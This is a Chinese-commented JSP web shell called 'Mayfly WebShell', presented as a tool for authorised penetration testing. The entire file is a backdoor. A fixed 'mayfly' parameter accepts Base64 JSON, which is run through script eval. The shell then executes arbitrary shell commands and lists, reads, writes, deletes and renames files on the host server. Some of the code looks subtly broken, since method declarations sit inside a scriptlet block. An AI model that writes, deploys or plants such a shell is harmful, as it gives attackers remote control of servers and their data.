<%@ page contentType="text/html;charset=UTF-8" %>
<%@ page import="java.io.*, java.util.*, javax.script.*" %>
<%
/**
 * ============================================================
 *  Mayfly WebShell - JSP 服务端脚本
 *  仅用于授权渗透测试与自有资产管理，禁止用于未授权访问。
 *  部署到 Tomcat 后，请修改 key 为高强度连接密码。
 *  注意：JSON 解析依赖 JDK 内置 Nashorn 引擎（JDK 8~14）。
 * ============================================================
 */
String key = "mayfly";

response.setContentType("text/plain");
String payload = request.getParameter(key);
if (payload == null || payload.length() == 0) {
    payload = request.getParameter("mayfly");
}
if (payload == null || payload.length() == 0) {
    out.print(Base64.getEncoder().encodeToString("{\"status\":\"error\",\"data\":\"\",\"message\":\"empty payload\"}".getBytes("UTF-8")));
    return;
}

byte[] raw = Base64.getDecoder().decode(payload);
String json = new String(raw, "UTF-8");

Map<String, Object> req = null;
try {
    ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
    if (engine == null) engine = new ScriptEngineManager().getEngineByName("nashorn");
    if (engine == null) {
        out.print(Base64.getEncoder().encodeToString("{\"status\":\"error\",\"data\":\"\",\"message\":\"no nashorn engine (need JDK<=14)\"}".getBytes("UTF-8")));
        return;
    }
    Object obj = engine.eval("(" + json + ")");
    req = (Map<String, Object>) obj;
} catch (Exception e) {
    out.print(Base64.getEncoder().encodeToString(("{\"status\":\"error\",\"data\":\"\",\"message\":\"bad json: " + e.getMessage() + "\"}").getBytes("UTF-8")));
    return;
}

String action = req.get("action") == null ? "" : (String) req.get("action");
Map<String, Object> params = req.get("params") instanceof Map ? (Map<String, Object>) req.get("params") : new HashMap<String, Object>();

String g(String name) {
    Object v = params.get(name);
    return v == null ? "" : v.toString();
}

void resp(String status, String data, String msg) throws IOException {
    String d = Base64.getEncoder().encodeToString(data.getBytes("UTF-8"));
    String j = "{\"status\":\"" + status + "\",\"data\":\"" + d + "\",\"message\":\"" + msg + "\"}";
    out.print(Base64.getEncoder().encodeToString(j.getBytes("UTF-8")));
}

String runCmd(String cmd) throws Exception {
    String os = System.getProperty("os.name").toLowerCase();
    ProcessBuilder pb;
    if (os.contains("win")) {
        pb = new ProcessBuilder("cmd", "/c", cmd);
    } else {
        pb = new ProcessBuilder("/bin/sh", "-c", cmd);
    }
    pb.redirectErrorStream(true);
    Process p = pb.start();
    InputStream in = p.getInputStream();
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    byte[] buf = new byte[8192];
    int n;
    while ((n = in.read(buf)) != -1) bos.write(buf, 0, n);
    p.waitFor();
    return bos.toString("UTF-8");
}

try {
    if ("cmd".equals(action)) {
        String cmd = g("cmd");
        if (cmd.length() == 0) { resp("error", "", "empty cmd"); return; }
        resp("ok", runCmd(cmd), "");
    }
    else if ("sysinfo".equals(action)) {
        String info = "Java: " + System.getProperty("java.version")
            + "\nOS: " + System.getProperty("os.name") + " " + System.getProperty("os.arch")
            + "\nUser: " + System.getProperty("user.name")
            + "\nCWD: " + new File(".").getCanonicalPath();
        resp("ok", info, "");
    }
    else if ("fileList".equals(action)) {
        String path = g("path");
        if (path.length() == 0) path = new File(".").getCanonicalPath();
        File dir = new File(path);
        if (!dir.isDirectory()) { resp("error", "", "not a directory"); return; }
        String cur = dir.getCanonicalPath();
        StringBuilder sb = new StringBuilder();
        sb.append(cur).append("\n");
        String parent = dir.getParent();
        if (parent != null) sb.append("d|0|0|..\t").append(parent).append("\n");
        File[] files = dir.listFiles();
        if (files == null) { resp("error", "", "cannot list"); return; }
        for (File f : files) {
            if (f.isDirectory()) sb.append("d|0|").append(f.lastModified()).append("|").append(f.getName()).append("\n");
            else sb.append("f|").append(f.length()).append("|").append(f.lastModified()).append("|").append(f.getName()).append("\n");
        }
        resp("ok", sb.toString(), "");
    }
    else if ("fileRead".equals(action)) {
        String path = g("path");
        File f = new File(path);
        if (!f.isFile()) { resp("error", "", "not a file"); return; }
        byte[] b = new byte[(int) f.length()];
        FileInputStream fis = new FileInputStream(f);
        fis.read(b); fis.close();
        resp("ok", new String(b, "UTF-8"), "");
    }
    else if ("fileWrite".equals(action)) {
        String path = g("path");
        String content = new String(Base64.getDecoder().decode(g("content")), "UTF-8");
        FileOutputStream fos = new FileOutputStream(path);
        fos.write(content.getBytes("UTF-8")); fos.close();
        resp("ok", "written", "");
    }
    else if ("fileDelete".equals(action)) {
        File f = new File(g("path"));
        boolean ok = f.delete();
        resp(ok ? "ok" : "error", ok ? "deleted" : "", ok ? "" : "delete failed");
    }
    else if ("fileRename".equals(action)) {
        boolean ok = new File(g("path")).renameTo(new File(g("newPath")));
        resp(ok ? "ok" : "error", ok ? "renamed" : "", ok ? "" : "rename failed");
    }
    else if ("fileMkdir".equals(action)) {
        boolean ok = new File(g("path")).mkdirs();
        resp(ok ? "ok" : "error", ok ? "created" : "", ok ? "" : "mkdir failed");
    }
    else {
        resp("error", "", "unknown action: " + action);
    }
} catch (Exception e) {
    resp("error", "", e.toString());
}
%>